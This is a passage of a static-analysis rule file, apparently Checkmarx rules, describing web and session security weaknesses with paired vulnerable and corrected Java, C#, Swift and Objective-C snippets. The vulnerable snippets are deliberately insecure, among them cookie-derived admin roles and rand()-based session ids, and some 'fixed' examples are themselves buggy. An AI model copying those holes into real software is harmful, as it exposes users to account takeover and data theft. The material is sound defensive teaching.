&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Input from the user is added to the current session without sanitizing it
      &lt;/h4&gt;&lt;pre&gt;

public class TrustBoundaryViolation
{
        public void foo()
        {
                string input = Console.ReadLine();
                HttpContext.Current.Session[�val�] = input;
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The numbers are extracted from the user inputed data before use
      &lt;/h4&gt;&lt;pre&gt;

public class TrustBoundaryViolationFixed
{
        public void foo()
        {
                string input = Console.ReadLine();
                string inputValue = int.Parse(input).ToString();
                HttpContext.Current.Session[�val�] = inputValue;
        }
}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1638</key><name>Authorization_Bypass_Through_User_Controlled_SQL_PrimaryKey</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If the application allows the external user to control the data identifier, and by extension the specific data record, then a malicious user could easily access unauthorized records. This could include reading private data of other users, writing records she is not authorized for, or even deleting another user's information.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application retrieves specific data records from the database, based on the value of the id provided by the user. However, the code does not enforce access control or other constraints on this value, and does not check that the requesting user has permission to access the specified record. This id value can be easily modified by the user, to some other arbitrary value that points to a record for which the user does not have permission.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&amp;nbsp;- Always perform access checks before responding to requests, both on the type of requested operation, and the specific records requested. In particular, verify the user has permission to perform the operation on the requested id.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Avoid exposing the internal primary key to the external interface. Prefer implementing a surrogate pointer, e.g. "this user's second account". Always ensure the user has access to the set of referenced records.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Externally Controlled Account Id&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountRecord(HttpServletRequest request) {
	int accountId = Integer.parseInt(request.getParameter("accountId"));
 	ResultSet accountdata = null;
  
  	try { 
        CallableStatement proc = conn.prepareCall("{call get_account_details(?)}");
        proc.setInt(1, accountId);
        accountdata = proc.executeQuery(); 
	} catch (SQLException ex) {
      	handleErrors(ex); 
    }
  	return accountdata;
}&lt;/pre&gt;&lt;h4&gt;Checked and Authorized Profile Id&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountRecord(HttpServletRequest request) {
	int accountId = Integer.parseInt(request.getParameter("accountId"));
 	ResultSet accountdata = null;

  	HttpSession session = request.getSession(true);
  	HashMap&lt;int, int&gt; accountList = (HashMap&lt;int, int&gt;)session.getAttribute("userAccounts");
  	int realAccount = accountList.get(accountId);
  	if (realAccount != null &amp;&amp;
        	Permissions.checkAccountPermission(request.getUserPrincipal(), realAccount) ) {

      	try { 
            CallableStatement proc = conn.prepareCall("{call get_account_details(?)}");
            proc.setInt(1, accountId);
            accountdata = proc.executeQuery(); 
        } catch (SQLException ex) {
            handleErrors(ex); 
        }
    }

  	return accountdata;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1677</key><name>Same_Seed_in_PRNG</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Random values are often used as a mechanism to prevent malicious users from guessing a value, such as a password, encryption key, or session identifier. Depending on what&amp;#160;this random value is used for, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values. This could enable the attacker to hijack another user's session, impersonate another user, or crack an encryption key (depending on what&amp;#160;the pseudo-random value was used for).&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a weak method of generating pseudo-random values, such that other numbers could be determined from a relatively small sample size. Since the pseudo-random number generator used is designed for statistically uniform distribution of values, it is approximately deterministic. Thus, after collecting a few generated values (e.g. by creating a few individual sessions, and collecting the sessionids), it would be possible for an attacker to calculate another sessionid.&amp;#160;&lt;br /&gt;Specifically, if this&amp;#160;pseudo-random value is used in any security context, such as passwords, keys, or secret identifiers, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Whenever unpredicatable numbers are required in a security context, use a cryptographically strong random number generator, instead of a statistical pseudo-random generator.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use the cryptorandom generator that is built-in to your language or platform, and ensure it is securely seeded. Do not seed the generator with a weak, non-random seed. (In most cases, the default is securely random).&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure you use a long enough random value, to make brute-force attacks unfeasible.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not use the statistical pseudo-random number generator, use the cryptorandom generator instead. In Java, this is the SecureRandom class.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Objc&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;long sessNum = rand();
NSString* sessionId = [NSString stringWithFormat:@"%ld", sessNum];&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;UInt32 sessBytes;
SecRandomCopyBytes(kSecRandomDefault, sizeof(sessBytes), (uint8_t*)&amp;sessBytes);
    
NSString* sessionId = [NSString stringWithFormat:@"%llu", sessBytes];&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;
Random random = new Random();

long sessNum = random.nextLong();

String sessionId = sessNum.toString();
&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;
SecureRandom random = new SecureRandom();

byte sessBytes[] = new byte[32];

random.nextBytes(sessBytes);

String sessionId = new String(sessBytes);
&lt;/pre&gt;&lt;h3&gt;Swift&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;let sessNum = rand();
let sessionId = String(format:"%ld", sessNum)&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;var sessBytes: UInt32 = 0
withUnsafeMutablePointer(&amp;sessBytes, { (sessBytesPointer) -&gt; Void in
    let castedPointer = unsafeBitCast(sessBytesPointer, UnsafeMutablePointer&lt;UInt8&gt;.self)
    SecRandomCopyBytes(kSecRandomDefault, sizeof(UInt32), castedPointer)
})
    
let sessionId = String(format:"%llu", sessBytes)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1671</key><name>Cleartext_Submission_of_Sensitive_Information</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Sensitive and personal details, such as passwords, social security numbers, credit card data, and other forms of PII (Personally Identifiable Information), must always be protected when being transmitted over the network. Sending this private data over the unencrypted network, without using SSL/TLS or other form of encryption, can reveal the users' secret information, and expose them&amp;#160;to risks of impersonation, identity theft, and financial fraud.&amp;#160;&lt;/div&gt;
&lt;div&gt;If the SSL/TLS channel is terminated on a front-end webserver, reverse proxy, or the like, this issue can be ignored.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application handles sensitive and private information&amp;#160;in several ways. At a certain point, this secret data is sent over the network, however the application does not use SSL/TLS, or any other secure protocol, and does not ensure the data is encrypted before sending it over the unprotected channel.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Always protect all PII and other sensitive data, especially when it is being sent over the network.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use SSL/TLS whenever transmitting sensitive data. Alternatively, other encrypted protocols, such as IPsec or SSH, can also be used.&amp;#160;&lt;/li&gt;
&lt;li&gt;Reconsider if the application absolutely requires these personal details. Data that is not received cannot be exposed.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;In web applications, do not output personal info directly to the response without verifying the channel is secured with SSL.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not write personal info directly to a standard socket either. Instead, always use SSLSocket to ensure your channel makes use of SSL/TLS.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using Standard Socket (No Encryption)&lt;/h4&gt;&lt;pre&gt;public void runServer() {
    ServerSocket server = new ServerSocket(PORT);
    Socket client;
    
    while (true) {
        client = server.accept(); 
        MyUser user = handleRequest(client.getInputStream());
        
        PrintWriter output = new PrintWriter(server.getOutputStream());
        output.println(user.AccountId);
        output.flush();
    }
}&lt;/pre&gt;&lt;h4&gt;Using Encrypted SSLSocket&lt;/h4&gt;&lt;pre&gt;public void runServer() {
    try { 
        SSLServerSocketFactory factory = 
            (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();
        
        ServerSocket server = factory.createServerSocket(PORT);
        Socket client;
        
        while (true) {
            client = server.accept(); 
            MyUser user = handleRequest(client.getInputStream());
            
            PrintWriter output = new PrintWriter(server.getOutputStream());
            output.println(user.AccountId);
            output.flush();
        }
    }
    catch (IOException ex) {
        handleException(ex);
    }
    finally {
        if (output != null) output.close(); 
        if (client != null) 
            if (!client.isClosed()) client.close(); 
        if (server != null) 
            if (!server.isClosed()) server.close();
    }
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1699</key><name>Unchecked_Input_for_Loop_Condition</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could input a very high value, potentially causing a denial of service (DoS).&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some repetitive task in a loop, and defines the number of times to perform the loop according to user input. A very high value could cause the application to get stuck in the loop and to be unable to continue to other operations.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Ideally, don&amp;#8217;t base a loop on user-provided data. If it is necessary to do so, the user input must be first validated and its range should be limited.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
If absolutely necessary to allow the user to define the parameters of a loop, ensure the input is validated and constrained.

      &lt;/h4&gt;&lt;pre&gt;


if ( Int32.TryParse(sLoopCountInput, out iLoopCount) )
{
if ((iLoopCount &gt; MAX_LOOPS) 

      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
If absolutely necessary to allow the user to define the parameters of a loop, ensure the input is validated and constrained.

      &lt;/h4&gt;&lt;pre&gt;


try
{
iLoopCount= Integer.parseInt(sLoopCountInput);
}
catch (NumberFormatException ex)
{
iLoopCount= MAX_LOOPS;
}
if ((iLoopCount &gt; MAX_LOOPS) 

      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1642</key><name>Exposure_of_System_Data</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;System data can provide attackers with valuable insights on systems and services they are targeting - any type of system data, from service version to operating system fingerprints, can assist&amp;nbsp;attackers to hone their attack, correlate data with known vulnerabilities or focus efforts&amp;nbsp;on developing new attacks against specific technologies.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;System data is read and subsequently exposed where it might be read by untrusted entities.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Consider the implications of exposure of the specified input,&amp;nbsp;and expected level of access to the specified output. If not required, consider removing this code, or modifying exposed information to exclude potentially sensitive system data.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Leaking Environment Variables in JSP Web-Page&lt;/h4&gt;&lt;pre&gt;  String envVarValue = System.getenv(envVar);
  if (envVarValue == null) {
      out.println("Environment variable is not defined:"); 
      out.println(System.getenv());
  } else {
      //[..]
  };&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3717</key><name>Client_State_Saving_Method_JSF</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;ViewState values, variables and serialized objects are processed by the server. Depending on implementation and use of this ViewState, this may lead to validation bypasses, unauthorized activity, cross-site scripting attacks, sensitive information leaks or remote code execution.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;ViewStates are used to maintain the current state of the user interface, whose values are associated to repopulate the view and give statefulness to the user interface. The ViewState itself is an encoded (and sometimes encrypted) serialized object, which is parsed by server code, which then performs a repopulation of the view. If saved on the server, users submit a token that associates their current state with the appropriate ViewState; however, if this ViewState is actually configured to be provided by clients, it would be vulnerable to tampering which, depending on the way its values are handled, may expose the server to various attacks, or could leak sensitive information to the client.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Set the value of "javax.faces.STATE_SAVING_METHOD" to "server", unless explicitly required.&lt;/p&gt;
&lt;p&gt;Ensure ViewState values and contents are treated as untrusted inputs to ensure poisoning of the ViewState cannot be used to attack the server or application users.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Web.Xml File with Unsafe Client ViewState Configuration&lt;/h4&gt;&lt;pre&gt;&lt;context-param&gt;
    &lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
    &lt;param-value&gt;client&lt;/param-value&gt;
&lt;/context-param&gt;&lt;/pre&gt;&lt;h4&gt;Web.Xml File with Safe Server ViewState Configuration&lt;/h4&gt;&lt;pre&gt;&lt;context-param&gt;
    &lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
    &lt;param-value&gt;server&lt;/param-value&gt;
&lt;/context-param&gt;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1676</key><name>Reliance_on_Cookies_without_Validation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Cookie values are used in making a decision without validating their contents - this may allow users to tamper with these cookies thus affecting the outcome of this decision, despite not being authorized to do so. This may lead to authorization and authentication bypasses, whose exploitation may lead to&amp;nbsp;account theft,&amp;nbsp;elevation of privilege and more, depending on implementation.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Cookie values are usually set by the server, via the Set-Cookie header, or via client-side code - thereby resulting in these values not being transparent to end-users. However, tampering with the values of these cookies is trivial, and therefore their contents should be treated as potentially malicious or tainted inputs.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;For any session-related&amp;nbsp;decisions, never rely on user inputs alone - always validate user authority and authenticity from trusted credentials, such as a session variable, before relying on cookie values in a decision.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User Creation Relying on Admin Role With Role Derived From Cookies&lt;/h4&gt;&lt;pre&gt;Cookie[] cookiejar = request.getCookies();
if (cookies != null) {
	for (Cookie cookie : cookiejar) {
		if (cookie.getName().equals("role") &amp;&amp; cookie.getValue().equals("admin")) {
			addUser(username, email, password, role);
		}	
        else 
        {
            unauthorizedError();
        }
	}
}
else 
{
	unauthorizedError();
}&lt;/pre&gt;&lt;h4&gt;User Creation Relying on Admin Role With Role Derived From Session Variables&lt;/h4&gt;&lt;pre&gt;String role = request.getSession(true).getAttribute("role"); // role attribute must never be set with input from users
if (role != null) {
	if (role.equals("admin")) {
		addUser(username, email, password, role);
	}
  	else 
    {
    	unauthorizedError();
    }
}
else 
{
	unauthorizedError();
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_636</key><name>Use_of_System_exit</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If an exit method can be invoked through some logical flow within the application, it will cause a prompt Denial-of-Service (DoS).&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Invocation of an exit method would immediately shut down the application.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Avoid using exit methods. Either handle any errors or exceptions, or configure the application to terminate in a timely manner.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Web-Application Which Exits on A Specific Exception&lt;/h4&gt;&lt;pre&gt;Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
  	if (isAuthorized()) {
      try {
          updateDb(request);
      }
      catch (UpdateDbException ude)
      {
          logger.error("Caught Exception While Updating DB: " + ude.toString());
          System.exit(1);
      }
      [..]&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_644</key><name>Spring_ModelView_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;ModelAndView constructors can create ModelAndView objects from file URIs that, if resolved from user input, may allow potential inclusion and disclosure of local files or bypass of application logic, by either providing a relative path or prefixing it with the "forward:" string. Resolving ModelAndView from user inputs may also allow&amp;nbsp;performing Open Redirect attacks, by prefixing a URL&amp;nbsp;with the "redirect:" string, redirect users to a website of an attacker's choosing.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;ModelAndView objects can be constructed from file URIs. If these URIs can be manipulated by user inputs, they are likely susceptible to attack.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Do not resolve ModelAndView objects based on unsanitized user inputs. If dynamic ModelAndView&amp;nbsp;resolution is required, consider applying a whitelist on allowed user inputs; otherwise, only return trusted an expected ModelAndView objects based on trusted values.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;ModelAndView Resolved From GET Parameter "page"&lt;/h4&gt;&lt;pre&gt;	@RequestMapping(value = "/content", method = RequestMethod.GET)
	public ModelAndView getContentFromParam(@RequestParam("page") String page)
    {
		return new ModelAndView(page);
	}&lt;/pre&gt;&lt;h4&gt;ModelAndView Resolved From GET Parameter "page", Where "page" Must Be in a Whitelist&lt;/h4&gt;&lt;pre&gt;	@RequestMapping(value = "/content", method = RequestMethod.GET)
	public ModelAndView getDataWithParams(@RequestParam("page") String page) {
		if (TRUSTED_PAGES.contains(page)) { //TRUSTED_PAGES is a white-list of allowed pages
			return new ModelAndView(page);
		} else {
			return getErrorMAV(404);
		}
	}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3875</key><name>Public_Data_Assigned_to_Private_Array</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Public Data Assigned to Private Array-Typed Field&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;496&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_496_Description" id="oc_496_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Assigning public data to a private array is equivalent to
giving public access to the array.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_496_Time of Introduction" id="oc_496_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_496_Applicable Platforms" id="oc_496_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;C&lt;/p&gt;
&lt;p&gt;C++&lt;/p&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;p&gt;.NET&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_496_Demonstrative Examples" id="oc_496_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;In the example below, the setRoles() method assigns a
publically-controllable array to a private field, thus allowing the caller
to modify the private array directly by virtue of the fact that arrays in
Java are mutable.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;private String[] userRoles;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;public void setUserRoles(String[] userRoles) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;this.userRoles = userRoles;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_496_Potential Mitigations" id="oc_496_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Do not allow objects to modify private members of a class.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
